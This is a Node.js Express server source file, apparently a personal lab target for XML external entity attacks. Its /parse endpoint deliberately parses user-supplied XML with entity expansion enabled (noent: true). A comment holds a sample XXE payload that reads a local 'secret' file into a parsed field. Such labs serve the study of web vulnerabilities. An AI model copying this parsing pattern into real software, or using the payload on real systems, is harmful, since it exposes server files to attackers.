const express = require('express');
const config = require('./config');
const path = require('path');
const bodyParser = require('body-parser');
const logger = require('morgan');
const libxml = require('libxmljs');

const app = express();
app.use(bodyParser.urlencoded({ extended: false}));
app.use(bodyParser.json());

app.use(logger('dev'));

//source the client facing html
app.get('/', function (req,res) {
    res.sendFile(path.join(__dirname + '/index.html'));
});

//source the client side javascript
app.get('/target_client.js', function(req,res){
    res.sendFile(path.join(__dirname + '/target_client.js'));
});


//This works in node terminal. Wire up and show with get request.
/**
 * '<?xml version="1.0" encoding="ISO-8859-1"?>' +
 '<!DOCTYPE foo [ <!ELEMENT foo ANY >' +
 '<!ENTITY xxe SYSTEM "/home/spencer/security/XMLEE/secret" >]>' +
 '<creds>' +
 '<user>&xxe;</user>' +
 '<pass>mypass</pass>' +
 '</creds>'

 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "/home/spencer/JavascriptAttacks/XMLEE/secret" >]><creds><user>&xxe;</user><pass>mypass</pass></creds>


 var doc = libxml.parseXml(xmlsrc, { noent: true });
 */
// app.post('/parse', function (req,res) {
//     console.log(req.body);
//     var xmlsrc = req.body;
//     var doc = libxml.parseXmlString(xmlsrc, { noent: true });
//     console.log(doc);
//     res.send(doc.toString());
// });
app.post('/parse', function (req,res) {
    console.log(req.body.input);
    var xmlsrc = req.body.input;
    var doc = libxml.parseXmlString(xmlsrc, { noent: true });
    console.log(doc.toString());
    res.send(doc.toString());
});

app.listen(config.target_port, function () {});